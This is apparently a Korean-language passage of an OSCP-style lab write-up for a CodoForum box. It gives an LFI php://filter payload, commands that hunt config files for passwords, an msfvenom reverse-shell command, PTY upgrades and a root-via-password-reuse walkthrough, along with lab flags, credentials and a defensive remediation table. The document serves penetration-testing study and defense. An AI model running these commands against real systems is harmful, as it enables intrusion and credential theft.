> [[Crane]]에서 정확히 같은 현상을 만났다 — `/config.php` 200, 0바이트.
> LFI가 있을 때 소스를 뽑는 방법:
> ```
> ?page=php://filter/convert.base64-encode/resource=sites/default/config.php
> ```

### 4-5. 자격증명 재사용 — **왜 DB 비밀번호가 root 비밀번호와 같은가**

```bash
www-data@codo:/var/www/html/sites/default$ su root
su root
Password: FatPanda123
whoami
root
pwd
/var/www/html/sites/default
cd
cat proof.txt
34f3ce7f6374b4993f09078273faa70c
```

**한 줄로 root다.** 익스플로잇도, 컴파일도, SUID 사냥도 없다.

> [!note] 실무에서 왜 이렇게 흔한가 — 원인은 게으름이 아니라 **구조**다
> | 원인 | 설명 |
> |---|---|
> | **설치 시점의 관리자가 한 사람** | 웹앱을 설치하는 사람이 곧 서버 root다. 그 순간 머릿속에 있는 비밀번호는 하나뿐이다 |
> | **DB 비밀번호는 "사람이 안 볼 값"이라는 착각** | 설정 파일에 박아두고 잊는다. 그래서 **강한 것 대신 기억하기 쉬운 것**을 넣는다 |
> | **비밀번호 관리자 미사용** | 값을 새로 만들면 어디 적어둘 곳이 없다 → 쓰던 걸 재사용 |
> | **자동화 스크립트** | Ansible/셸 스크립트 하나에 변수 하나(`$PASSWORD`)로 DB·OS·앱을 전부 설정 |
> | **로테이션 부재** | 한 번 정하면 몇 년을 간다. 재사용의 효과가 시간이 지나도 안 줄어든다 |
>
> **결론: 평문 비밀번호를 하나 주우면, 그것은 "DB 비밀번호"가 아니라 "이 조직이 쓰는 비밀번호"로 취급한다.**

> [!tip] 자격증명 하나를 주우면 **전면 재사용 시험**을 한다
> 대상 목록을 먼저 만든다:
> ```bash
> cat /etc/passwd | grep -E 'sh$' | cut -d: -f1     # 셸이 있는 계정만
> ls /home                                          # 홈 디렉터리가 있는 계정
> ```
> 시험할 곳:
> | 대상 | 명령 |
> |---|---|
> | root | `su root` |
> | 각 일반 계정 | `su <user>` |
> | **DB 사용자명과 같은 OS 계정** | `su codo` ← 이름 일치는 강한 신호다([[Fanatastic]]) |
> | SSH | `ssh <user>@192.168.243.23` |
> | 웹 관리자 패널 | 같은 비밀번호로 다른 앱 로그인 |
> | MySQL 안의 다른 계정 | `mysql -u codo -p'FatPanda123' -e "select * from mysql.user\G"` |
>
> **비밀번호를 하나 주웠으면 계정 목록 전체를 훑는다.** 순서는 root 먼저 — 성공하면 나머지가 필요 없다.

### 4-6. `su`로 시험하는 것과 SSH로 시험하는 것의 차이

| 항목 | `su <user>` (로컬) | `ssh <user>@target` (원격) |
|---|---|---|
| **TTY 요구** | **필수.** PTY 없는 리버스셸에서는 `su: must be run from a terminal` 로 거부된다 | 칼리에서 실행하므로 TTY 문제 없음 |
| **얻는 셸의 품질** | 상위 셸의 품질을 물려받는다 — PTY 없으면 여전히 불편 | **완전한 TTY.** 탭 완성·Ctrl+C·`vi` 전부 정상 |
| **서버 설정에 막히는가** | 거의 안 막힌다. `su`는 로컬 인증 | **`PermitRootLogin no`면 root SSH가 막힌다**(Ubuntu 기본값이 `prohibit-password`) |
| | | `AllowUsers`/`DenyUsers`, `PasswordAuthentication no` 에도 막힌다 |
| **네트워크 필요** | 불필요 — 이미 안에 있다 | 22가 **외부에서** 열려 있어야 한다 |
| **남는 로그** | `/var/log/auth.log`의 `su` 항목 | `auth.log` + `wtmp`/`lastlog`. **`w`·`last`에 세션이 보인다** |
| **안정성** | 리버스셸이 끊기면 같이 죽는다 | **독립 세션.** 리버스셸이 죽어도 유지된다 |
| **속도** | 즉시 | 즉시 |

> [!danger] **`su`가 `must be run from a terminal`을 뱉는다고 비밀번호가 틀린 게 아니다**
> 이 오독이 자격증명 재사용 박스에서 가장 자주 시간을 태우는 지점이다. `su`는 비밀번호를 **터미널에서만** 읽으려 하기 때문에 PTY가 없으면 **인증을 시도조차 안 한다.**
> 순서를 고정하라: **PTY 업그레이드 → `su`.**
> ```bash
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> su root
> ```
> 원문 기록에서는 `su root` 가 곧바로 성립했다. **[가정]** 중간에 PTY 업그레이드를 했으나 노트에 옮겨 적지 않았거나, 이 판본의 웹셸이 PTY를 함께 제공했을 가능성이 높다. **어느 쪽이든 시험장에서는 PTY를 먼저 올리는 절차로 고정하는 것이 안전하다.**

> [!tip] `su root` 와 `su - root` 의 차이
> - `su root` — **환경을 물려받는다.** `PWD`가 그대로다(원문에서 `pwd`가 `/var/www/html/sites/default`인 이유)
> - `su - root` — **로그인 셸.** `/root`로 이동하고 `PATH`·`HOME`·프로필이 root 것으로 새로 설정된다
>
> 권한상승 후 `sbin` 도구(`iptables`·`tcpdump`)가 "command not found"로 안 보이면 **`PATH`를 안 물려받은 것**이다. `su -`를 쓰거나 `export PATH=$PATH:/usr/sbin:/sbin`.
> 원문의 `cd`(인자 없음)는 `$HOME`으로 가는 것이고, root의 `$HOME`은 `/root`다. 그래서 바로 `cat proof.txt`가 통했다.

### 4-7. 재사용이 안 통했다면 — 다음 후보 경로

이 박스가 `su root`에서 막혔다면 순서는 이랬을 것이다:

1. **`su codo`** — DB 사용자명과 같은 OS 계정 (`/etc/passwd` 확인)
2. **DB 안의 해시 덤프** → `mysql -u codo -p'FatPanda123' codoforumdb -e "select * from <users테이블>"` → hashcat
3. **`/etc/passwd` 쓰기 가능 여부** — `ls -l /etc/passwd`
4. **SUID/capabilities 재확인** — GTFOBins 대조
5. **크론** — `/etc/crontab`, `pspy`로 주기 프로세스 관찰
6. **커널 익스플로잇** — `5.4.0-150-generic`. **최후 수단.** 재부팅/패닉 위험이 있어 시험에서는 다른 길이 전부 막힌 뒤에만

---

## 5. 플래그

```bash
cd
cat proof.txt
34f3ce7f6374b4993f09078273faa70c
```

| | 위치 | 값 |
|---|---|---|
| `proof.txt` | `/root/proof.txt` (root의 `$HOME`) | `34f3ce7f6374b4993f09078273faa70c` |
| `local.txt` | **없음** — 포털 진행도 `1/1` | Fundamental 박스라 사용자 단계 없이 root 하나 |

> [!tip] 시험 증거 형식 연습
> 실제 시험에서는 플래그를 **`whoami`·`hostname`·`ip a`와 한 화면에** 찍어야 인정된다. 이 박스에서라면:
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> `hostname` 바이너리가 없는 배포판이면 `uname -n` 또는 `cat /etc/hostname`으로 대체([[Hawat]]).
> **스크린샷을 나중에 다시 찍으려고 미루지 마라.** 랩이 리버트되면 다시 뚫어야 한다.

---

## 6. 막혔던 지점 / 이 유형에서 흔히 막히는 지점

> [!abstract] 원문에 실제 시행착오 기록이 없다
> 이 박스는 정찰 → 로그인 → 업로드 → 설정 파일 → `su`가 **한 번에 통과**해서 실패 기록이 남아 있지 않다.
> 그러나 **같은 유형에서 반복적으로 시간을 태우는 지점은 정해져 있다.** 아래는 실측 기록이 아니라 **유형별 함정 목록**이다.

### ① 업로드는 성공했는데 404 — 경로/파일명 문제

가장 흔한 막힘이다. 업로드 응답이 "성공"이라도 **파일명이 해시로 바뀌었거나, 웹루트 밖(`/var/tmp`)에 저장됐거나, `.htaccess`로 실행이 차단**됐을 수 있다.
- **404** = 그 URL에 파일이 없다 → 경로/파일명 문제
- **200인데 소스가 그대로 보인다** = PHP로 실행이 안 된다 → 실행 차단 or 확장자 문제
- **403** = 디렉터리 접근 차단
세 응답을 구분하는 것이 첫 갈림길이다. 2-5절의 경로 찾기로 되돌아간다.

### ② `su`가 `must be run from a terminal` — 비밀번호가 틀린 걸로 오독

4-6절에서 다뤘다. **PTY를 먼저 올린다.** 이걸 모르면 정답 비밀번호를 손에 쥐고도 "안 통한다"고 결론 내린다.

### ③ SSH로 root 로그인을 시도하다 막힘

`ssh root@192.168.243.23`으로 `FatPanda123`을 넣으면 **Ubuntu 기본 `PermitRootLogin prohibit-password` 때문에 거부**될 수 있다. 그러면 "비밀번호가 틀렸다"고 오판한다.
**로컬에 셸이 있으면 `su`가 SSH보다 우선이다.** SSH는 셸이 없을 때나, 안정적인 TTY가 필요할 때 쓴다.

### ④ 버전 특정을 건너뛴 채 진행

1장에서 지적한 대로 CodoForum **버전을 확정하지 않았다.** 기본 자격증명이 통해서 결과적으로 문제가 없었을 뿐이다.
**만약 `admin:admin`이 막혔다면** 버전 없이는 `searchsploit`을 돌릴 수도 없어 완전히 멈췄을 것이다. `readme.txt`가 웹루트에 있었으므로 **1분이면 해결됐다.**

### ⑤ `MikroTik RouterOS 97%`를 쫓아감

nmap이 `Warning: OSScan results may be unreliable`을 명시했는데도 97%라는 숫자에 끌려 라우터 익스플로잇을 뒤지는 경우가 있다.
**닫힌 포트가 없으면 OS 지문은 신뢰할 수 없다.** 배너(`OpenSSH 8.2p1 Ubuntu 4ubuntu0.7`)가 훨씬 강한 근거다.

### ⑥ 시간 배분 — 이 박스의 적정 소요

| 단계 | 적정 시간 | 손절선 |
|---|---|---|
| Nmap 전 포트 | 1~2분 | — |
| 웹 열거 + 관리 경로 발견 | 5분 | 10분 넘게 관리 경로가 안 나오면 소스/문서로 경로 관례를 확인 |
| **기본 자격증명 시도** | **2분** | 10개 조합에서 안 되면 **즉시 다른 공격면으로**. 브루트포스로 넘어가지 마라 |
| 업로드 → 웹셸 실행 | 10분 | **20분** 넘게 실행이 안 되면 업로드가 아니라 테마 편집기·플러그인 경로로 갈아탄다 |
| 설정 파일 열거 | **3분** | `grep -rn password /var/www`는 30초면 끝난다. 여기서 오래 걸릴 이유가 없다 |
| 재사용 시험 | 3분 | 계정 목록 전체를 훑고 안 되면 4-7절의 다음 후보로 |
| **총계** | **25~30분** | 1시간을 넘으면 접근 자체를 재검토 |

**Fundamental 난이도는 30분 안에 끝나야 정상이다.** 이 시계를 머리에 넣고 있으면 "지금 막힌 게 아니라 잘못된 길에 있다"는 판단이 빨라진다.

---

## 7. OSCP 시험 관점

1. **로그인 폼을 보면 기본 자격증명이 1순위다.** `admin:admin` 한 번으로 이 박스의 인증 전제조건이 해결됐다. 브루트포스는 시간·잠금·규정 모든 면에서 나쁜 선택이다. 순서: **제품 기본값 → `admin:admin` 계열 → 정찰에서 주운 값 → (그때서야) 짧은 스프레이.**
2. **⚠️ 시험 금지 도구 — 이 박스에서 쓰고 싶어지는 것과 수동 대안**

   | 금지/제한 도구 | 수동 대안 |
   |---|---|
   | **Metasploit `exploit/multi/http/*_upload`** (1대 한정) | 관리자 패널에서 **직접 업로드** → URL 호출. 이 노트의 절차 전체가 수동이다 |
   | **AutoRecon / nmap 자동 스크립트 전개** | `nmap -sCV -p- -Pn --min-rate 5000 -oN nmap.log` 한 줄 |
   | **hydra 로그인 브루트포스** | 기본 자격증명 10개를 **손으로**. `curl -d 'username=..&password=..'` 반복 |
   | **자동 privesc 스크립트에만 의존** | `linpeas.sh`는 보조다. **`grep -rn password /var/www`** 를 직접 친다 — 이 박스는 그 한 줄로 끝났다 |
   | **msfvenom** | **허용된다.** `msfvenom -p php/reverse_php LHOST=.. LPORT=.. -f raw -o payload.php` |
   | **nc / rlwrap** | **허용된다.** 이 박스의 리스너 그대로 |
3. **업로드 성공 ≠ RCE.** 세 조건(확장자 저장 · 웹루트 아래 · 실행 허용)을 분리해서 확인하라. **404 / 200에 소스 노출 / 403** 을 구분하면 어디가 막혔는지 즉시 안다.
4. **업로드 경로는 응답이 알려준다.** 미리보기 URL·`href`·JSON의 `url` 필드·`Location` 헤더를 먼저 본다. 안 알려주면 제품별 관례 경로 표(2-5절)를 두드린다. 파일명이 해시로 바뀌는 경우를 항상 염두에 둬라.
5. **www-data 셸을 잡으면 웹루트 설정 파일이 SUID보다 먼저다.** 서비스 계정은 SUID·크론이 걸릴 일이 거의 없다. `find / -perm -4000`을 돌리기 전에 `cat <웹루트>/config.php`를 쳐라.
6. **설정 파일 이름은 스택마다 정해져 있다** — `config.php` · `wp-config.php` · `settings.php` · `configuration.php` · `.env` · `application.properties` · `settings.py` · `database.yml` · `web.config` · `tomcat-users.xml`. **암기 대상이다.** 못 찾으면:
   ```bash
   grep -rniE "pass(word|wd)?\s*[=:>]" /var/www --include="*.php" 2>/dev/null
   find / -name ".env" -o -name "config*.php" 2>/dev/null
   ```
7. **평문 비밀번호를 하나 주우면 전면 재사용 시험을 한다.** `su root` → `su <각 계정>` → `ssh` → 다른 웹 패널 → DB 내부 계정. **root부터 시험한다** — 성공하면 나머지가 필요 없다.
8. **`su`는 PTY를 요구한다.** `must be run from a terminal`은 **비밀번호 오류가 아니다.** `python3 -c 'import pty; pty.spawn("/bin/bash")'` → `script -qc /bin/bash /dev/null` 순으로 올린 뒤 `su`.
9. **로컬 셸이 있으면 `su`가 SSH보다 우선이다.** SSH는 `PermitRootLogin`·`PasswordAuthentication`·`AllowUsers`에 막힐 수 있고, 그 거부를 "비밀번호 틀림"으로 오독하기 쉽다. 반대로 **안정된 TTY가 필요하면 SSH가 낫다.**
10. **`su -` 를 쓰면 `PATH`·`HOME`이 root 것으로 바뀐다.** 권한상승 후 `sbin` 도구가 안 보이면 이걸 의심하라.
11. **`Warning: OSScan results may be unreliable`이 붙은 OS 추측은 버려라.** 서비스 배너의 **패키지 리비전**(`8.2p1 Ubuntu 4ubuntu0.7` → focal)이 훨씬 정확하다.
12. **버전은 근거 2개로 못 박고 시작한다.** 이 박스는 기본 자격증명이 통해 넘어갔지만, 막혔다면 버전 없이 `searchsploit`조차 못 돌린다. `readme.txt`·`CHANGELOG.txt`·`<meta generator>`·정적 자원의 `?v=` 쿼리.
13. **리버스셸이 안 붙으면 `tun0` IP를 먼저 의심하고, 그 다음 아웃바운드 포트(443·80·53)를 의심한다.** 페이로드 안의 IP/포트를 안 고친 경우가 그 다음이다.
14. **시간 시계: Fundamental은 30분.** 1시간을 넘으면 뚫리는 중이 아니라 잘못된 길에 있는 것이다.

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| **관리자 계정이 `admin:admin`** | 설치 마법사에서 **약한 비밀번호를 거부**하고, 설치 후 기본 계정으로 로그인하면 강제 변경 화면을 띄운다. 관리 경로에 **IP 제한 + MFA** 추가 |
| **관리 패널이 인터넷에 그대로 노출** | `/admin`을 VPN·사내망·bastion 뒤로. Apache에서 `<Location /admin>` + `Require ip` |
| **업로드 확장자 검증 부재/우회 가능** | **화이트리스트**(`jpg`·`png`·`pdf`)로 검증하고, 확장자·MIME·매직바이트를 **모두** 확인. 서버에서 파일명을 **랜덤 재생성**하고 원본 확장자를 버린다 |
| **업로드 디렉터리에서 PHP가 실행됨** | **가장 값싸고 효과적인 조치.** 업로드 디렉터리에서 스크립트 실행을 끈다:<br>`<Directory /var/www/html/sites/default/assets/img/attachments>`<br>`  php_admin_flag engine off`<br>`  Options -ExecCGI`<br>`  AddType text/plain .php .phtml .php5 .phar`<br>`</Directory>`<br>더 나은 방법: **업로드물을 웹루트 밖에 저장**하고 스크립트로 중계 |
| **`config.php`가 웹루트 아래에 평문 비밀번호를 담고 있음** | 설정을 **웹루트 밖**(`/etc/codoforum/`)에 두고, 값은 환경변수·시크릿 관리자(Vault·AWS Secrets Manager)에서 주입. 파일 권한은 `640 root:www-data` |
| **DB 비밀번호 = root 비밀번호 (자격증명 재사용)** | **이 박스에서 root를 내준 유일한 원인.** 계정마다 고유한 무작위 비밀번호. 비밀번호 관리자를 표준 절차에 넣는다. 재사용 여부를 정기 점검 |
| **DB 계정이 과도한 권한** | 애플리케이션 DB 계정에는 해당 스키마의 CRUD만. `FILE`·`SUPER`·`GRANT` 회수 |
| **root 계정에 비밀번호 로그인 허용** | `passwd -l root`로 잠그고 `sudo`만 사용. `su root` 자체가 성립하지 않게 된다 |
| **`config.php.example`·`readme.txt`가 웹에 노출** | 배포 시 설치 잔여물 제거. 버전 노출은 공격자의 익스플로잇 검색 시간을 직접 단축시킨다 |
| **PHPSESSID에 HttpOnly 없음** (nmap 지적) | `session.cookie_httponly=1`, `session.cookie_secure=1`, `SameSite=Lax`. XSS와 결합 시 세션 탈취로 이어진다 |
| 탐지 부재 | 웹루트에 대한 **파일 무결성 모니터링**(AIDE·auditd). 업로드 디렉터리에 `.php` 파일이 생기는 것은 **정상 상황이 없다** — 즉시 경보 |

---

## 9. 참고 자료

- **CVE 없음** — 기본 자격증명 + 인증 후 업로드 + 자격증명 재사용의 조합이다
  - OWASP **A05: Security Misconfiguration**, **A07: Identification and Authentication Failures**
  - CWE-1392 Use of Default Credentials · CWE-434 Unrestricted Upload of File with Dangerous Type · CWE-522 Insufficiently Protected Credentials
- CodoForum (Codologic) — 제품 확인용 문자열: `IN_CODOF`, `get_codo_db_conf()`, `@CODOLICENSE`, `sites/default/` 레이아웃
- pentestmonkey `php-reverse-shell.php` — 칼리 경로 `/usr/share/webshells/php/php-reverse-shell.php` (`$ip`·`$port` 수정 필수)
- PayloadsAllTheThings — Upload Insecure Files: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
- GTFOBins: https://gtfobins.github.io/ (재사용이 실패했을 때의 SUID/capability 경로)
- TTY 업그레이드: `python3 -c 'import pty; pty.spawn("/bin/bash")'` / `script -qc /bin/bash /dev/null` / `stty raw -echo; fg`
- `sshd_config` `PermitRootLogin` 기본값(Ubuntu: `prohibit-password`) — SSH로 root 비밀번호 시험이 실패하는 이유

## 남긴 흔적

| 항목 | 상태 |
|---|---|
| `/var/www/html/sites/default/assets/img/attachments/payload.php` (웹셸) | 남아 있음 — 랩 Stop/Revert로 소멸 |
| CodoForum 첨부 DB 레코드 (업로드 기록) | 남아 있음 |
| `auth.log`의 `su` 성공 기록 | 남아 있음 |

획득 자격증명: CodoForum 관리자 **`admin` / `admin`**, MySQL **`codo` / `FatPanda123`**, **root / `FatPanda123`**(재사용).

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Crane]] — SuiteCRM `admin:admin` → 인증 후 RCE → `config.php`에서 DB 자격증명. **가장 가까운 쌍둥이 박스**
- [[Levram]] — Gerapy `admin:admin` → 인증 후 RCE → `app.service`의 평문 root 비밀번호로 권한상승
- [[Exfiltrated]] — Subrion `admin:admin` → 인증 우회 업로드(`.phar`)
- [[Fanatastic]] — 설정 파일의 자격증명 재사용, **DB 사용자명 = OS 계정명**이라는 신호
- [[Hawat]] — Nextcloud `admin:admin`, PTY 업그레이드 대안, 아웃바운드 포트 제약
- [[Squid]] — 파일 쓰기로 웹셸을 심는 다른 경로
- [[_STATUS]] — 283개 전수 진행현황
